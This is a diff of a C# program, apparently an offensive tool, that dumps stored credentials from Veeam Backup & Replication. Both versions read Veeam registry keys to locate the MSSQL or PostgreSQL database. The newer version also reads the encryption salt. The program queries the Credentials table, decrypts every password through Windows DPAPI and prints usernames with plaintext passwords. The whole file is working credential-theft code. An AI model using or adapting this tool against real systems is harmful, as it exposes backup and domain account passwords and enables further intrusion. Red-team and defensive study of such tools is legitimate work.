@@ -1,144 +1,155 @@
 ﻿using System;
-using System.Collections.Generic;
+using System.Data;
+using Microsoft.Win32;
 using System.Data.SqlClient;
+using Npgsql;
 using System.Security.Cryptography;
 using System.Text;
-using Microsoft.Win32;
+using System.IO;
+
 class Program
 {
+    static readonly string logPath = "app.log";
+
     static void Main()
     {
-
-        string banner  = @"
-   _____ __                   _    __                          ____                             __            
-  / ___// /_  ____ __________| |  / /__  ___  ____ _____ ___  / __ \___  ____________  ______  / /_____  _____
-  \__ \/ __ \/ __ `/ ___/ __ \ | / / _ \/ _ \/ __ `/ __ `__ \/ / / / _ \/ ___/ ___/ / / / __ \/ __/ __ \/ ___/
- ___/ / / / / /_/ / /  / /_/ / |/ /  __/  __/ /_/ / / / / / / /_/ /  __/ /__/ /  / /_/ / /_/ / /_/ /_/ / /    
-/____/_/ /_/\__,_/_/  / .___/|___/\___/\___/\__,_/_/ /_/ /_/_____/\___/\___/_/   \__, / .___/\__/\____/_/     
-                     /_/                                                        /____/_/                      
-
-Author: @ShitSecure";
-
-        Console.WriteLine(banner);
-
-        string sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlDatabaseName");
-        string sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlInstanceName");
-        string sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlServerName");
-        
-
-        if (sqlDatabaseName == null)
+        try
         {
-            // If values not found in the first registry path, try the second one
-            sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlDatabaseName");
-            
-        }
-
-        if (sqlInstanceName == null)
-        {
-            // If values not found in the first registry path, try the second one
-            sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlInstanceName");
-        }
-
-        if (sqlServerName == null)
-        {
-            // If values not found in the first registry path, try the second one
-            sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlServerName");
-        }
-        
-            Console.WriteLine("\r\n\r\n[*] SqlDatabase: " + sqlDatabaseName);
-            Console.WriteLine("[*] SqlInstance: " + sqlInstanceName);
-            Console.WriteLine("[*] SqlServer: " + sqlServerName);
-            
-       
-        if (sqlServerName == null)
-        {
-            Console.WriteLine("[-] Server not found, exit...");
-            return;
-            
-        }
-        
-
-
-        // Modify the connection string based on your Veeam setup
-        string connectionString = $"Server={sqlServerName}\\{sqlInstanceName};Database={sqlDatabaseName};Integrated Security=True";
-
-        List<Tuple<string, string>> credentials = new List<Tuple<string, string>>();
-
-        using (SqlConnection connection = new SqlConnection(connectionString))
-        {
-            try
+            string cfg = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations", "SqlActiveConfiguration");
+            if (cfg == null)
             {
-                connection.Open();
-                
-                Console.WriteLine("[+] Connected to the Veeam database.");
-
-                // Execute custom SQL command to retrieve user_name and password
-                // Thanks checkymander ;-) https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/ 
-                string sqlQuery = "SELECT user_name, password FROM VeeamBackup.dbo.Credentials";
-                using (SqlCommand command = new SqlCommand(sqlQuery, connection))
-                {
-                    using (SqlDataReader reader = command.ExecuteReader())
-                    {
-                        while (reader.Read())
-                        {
-                            string userName = reader["user_name"].ToString();
-                            string encryptedPassword = reader["password"].ToString();
-                            string decryptedPassword = DecryptPassword(encryptedPassword);
-                            credentials.Add(Tuple.Create(userName, decryptedPassword));
-                        }
-                    }
-                }
+                Log("Ошибка конфигурации.");
+                return;
             }
-            catch (Exception ex)
+
+            string saltB64 = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup and Replication\Data", "EncryptionSalt");
+            if (string.IsNullOrEmpty(saltB64))
             {
-                Console.WriteLine($"Error: {ex.Message}");
+                Log("Ошибка соли.");
+                return;
             }
-        }
 
-        foreach (var credential in credentials)
-        {
-            Console.WriteLine($"[+] User Name: {credential.Item1}, Password: {credential.Item2}");
+            byte[] salt = Convert.FromBase64String(saltB64);
+            if (cfg == "MsSql") HandleMsSql(salt);
+            else if (cfg == "PostgreSql") HandlePgSql(salt);
         }
+        catch (Exception ex) { Log($"Ошибка: {ex.Message}"); }
     }
 
-
-    static string GetRegistryValue(string registryPath, string valueName)
+    static void HandleMsSql(byte[] slt)
     {
         try
         {
-            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
+            string srv = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\MsSql", "SqlServerName");
+            string ins = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\MsSql", "SqlInstanceName");
+            string db = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\MsSql", "SqlDatabaseName");
+
+            string connStr = $"Server={srv}\\{ins};Database={db};Integrated Security=True;";
+            string qry = "SELECT user_name, password, description, change_time_utc FROM [dbo].[Credentials]";
+
+            using (var conn = new SqlConnection(connStr))
             {
-                if (key != null)
-                {
-                    return key.GetValue(valueName)?.ToString();
-                }
-                else
-                {
-                    Console.WriteLine($"[-] Registry path not found: {registryPath}");
-                }
+                var cmd = new SqlCommand(qry, conn);
+                var adp = new SqlDataAdapter(cmd);
+                var ds = new DataSet();
+
+                conn.Open();
+                adp.Fill(ds);
+                conn.Close();
+
+                ProcData(ds, slt);
+            }
+        }
+        catch (Exception ex) { Log($"Ошибка MsSql: {ex.Message}"); }
+    }
+
+    static void HandlePgSql(byte[] slt)
+    {
+        try
+        {
+            string srv = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\PostgreSql", "SqlHostName");
+            string prt = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\PostgreSql", "SqlHostPort");
+            string db = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\PostgreSql", "SqlDatabaseName");
+
+            string connStr = $"Host={srv};Port={prt};Database={db};Integrated Security=true;";
+            string qry = "SELECT user_name, password, description, change_time_utc FROM credentials";
+
+            using (var conn = new NpgsqlConnection(connStr))
+            {
+                var cmd = new NpgsqlCommand(qry, conn);
+                var adp = new NpgsqlDataAdapter(cmd);
+                var ds = new DataSet();
+
+                conn.Open();
+                adp.Fill(ds);
+                conn.Close();
+
+                ProcData(ds, slt);
+            }
+        }
+        catch (Exception ex) { Log($"Ошибка PgSql: {ex.Message}"); }
+    }
+
+    static void ProcData(DataSet ds, byte[] slt)
+    {
+        foreach (DataTable tbl in ds.Tables)
+        {
+            foreach (DataRow rw in tbl.Rows)
+            {
+                string usr = rw["user_name"].ToString();
+                string encPwd = rw["password"].ToString();
+                string decPwd = Decrypt(encPwd, slt);
+
+                string desc = rw["description"].ToString();
+                string chgTime = rw["change_time_utc"].ToString();
+
+                Console.WriteLine($"User: {usr}, Password: {decPwd}, Desc: {desc}, Change: {chgTime}");
+            }
+        }
+    }
+
+    static string Decrypt(string pwd, byte[] slt)
+    {
+        try
+        {
+            byte[] encPwd = Convert.FromBase64String(pwd);
+            byte[] decPwd = ProtectedData.Unprotect(encPwd, slt, DataProtectionScope.LocalMachine);
+            return Encoding.UTF8.GetString(decPwd);
+        }
+        catch (Exception ex)
+        {
+            Log($"Ошибка расшифровки: {ex.Message}");
+            return "Ошибка";
+        }
+    }
+
+    static string GetRegVal(RegistryHive hv, string key, string name)
+    {
+        try
+        {
+            using (var bKey = RegistryKey.OpenBaseKey(hv, RegistryView.Default))
+            using (var sKey = bKey.OpenSubKey(key))
+            {
+                if (sKey != null) return sKey.GetValue(name)?.ToString();
+                return null;
             }
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"[-] Error reading registry: {ex.Message}");
+            Log($"Ошибка реестра: {ex.Message}");
+            return null;
         }
-        return null;
     }
 
-
-    static string DecryptPassword(string encryptedPassword)
+    static void Log(string msg)
     {
         try
         {
-            // base64 decode the encryptedpassword
-            byte[] encryptedbytePassword = Convert.FromBase64String(encryptedPassword);
-            byte[] decryptedData = ProtectedData.Unprotect(encryptedbytePassword, null, DataProtectionScope.LocalMachine);
-            return Encoding.Default.GetString(decryptedData);
+            File.AppendAllText(logPath, $"{DateTime.Now}: {msg}\n");
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"Error decrypting password: {ex.Message}");
-            return string.Empty;
+            Console.WriteLine($"Ошибка лога: {ex.Message}");
         }
     }
 }
